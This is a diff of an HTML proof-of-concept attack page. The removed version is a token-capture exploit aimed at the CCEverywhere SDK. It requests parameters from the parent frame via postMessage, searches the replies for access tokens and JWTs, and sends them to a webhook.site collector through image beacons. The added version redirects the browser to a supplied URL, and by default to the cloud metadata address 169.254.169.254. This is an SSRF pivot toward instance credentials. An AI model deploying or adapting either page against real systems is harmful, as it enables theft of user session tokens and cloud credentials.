@@ -1,49 +1,27 @@
 <!doctype html>
 <html>
-<head><meta charset="utf-8"><title>mxp</title></head>
-<body>
-<h3>cceverywhere baseMXP token-capture PoC</h3>
-<pre id="log">waiting for CCEverywhere SDK handshake...</pre>
+<head>
+<meta charset="utf-8">
+
 <script>
-var OOB = "https://webhook.site/8e9ceeed-435f-4eaa-92f9-fc623ce7eb1e";
-var CH  = "CC_EVERYWHERE_AGENT";
-var logEl = document.getElementById("log");
-function log(m){ logEl.textContent += "\n" + m; }
-function exfil(path, payload){
-  try { new Image().src = OOB + "/" + path + "?d=" + encodeURIComponent(JSON.stringify(payload).slice(0,1500)) + "&t=" + Date.now(); } catch(e){}
-}
-function askParams(){
-  var env = { sourceChannel: CH, requestId: "poc-" + Math.floor(performance.now()), message: { type: "PARAMS_REQUEST", data: {} } };
-  try { parent.postMessage(env, "*"); } catch(e){}
-}
-window.addEventListener("message", function(ev){
-  var d = ev.data;
-  if (!d || typeof d !== "object") return;
-  var msg = d.message || d;
-  var type = msg && msg.type;
-  if (type) log("recv " + type + " from " + ev.origin);
-  var found = scanForToken(d);
-  if (found){
-    log("CAPTURED IMS TOKEN: " + found.slice(0,32) + "...");
-    exfil("CCE_IMS_TOKEN_STOLEN", { origin: ev.origin, token: found });
-  } else if (type === "PARAMS_RESPONSE"){
-    exfil("CCE_PARAMS_RESPONSE_NOTOKEN", msg.data || msg);
-  }
-});
-function scanForToken(o){
-  var hit = null;
-  (function walk(x, key){
-    if (hit || x == null) return;
-    if (typeof x === "string"){
-      if ((key && /access?_?token/i.test(key) && x.length > 20) || /^eyJ[A-Za-z0-9_-]+\.eyJ/.test(x)) hit = x;
-      return;
-    }
-    if (typeof x === "object") for (var k in x){ try{ walk(x[k], k); }catch(e){} }
-  })(o, "");
-  return hit;
-}
-askParams();
-var n=0, iv=setInterval(function(){ askParams(); if(++n>40) clearInterval(iv); }, 500);
+var u =
+    new URLSearchParams(location.search).get('u') ||
+    'http://169.254.169.254/latest/meta-data/';
+
+location.replace(u);
 </script>
+
+</head>
+
+<body>
+
+<noscript>
+<meta
+    http-equiv="refresh"
+    content="0;url=http://169.254.169.254/latest/meta-data/">
+</noscript>
+
+no-js
+
 </body>
 </html>
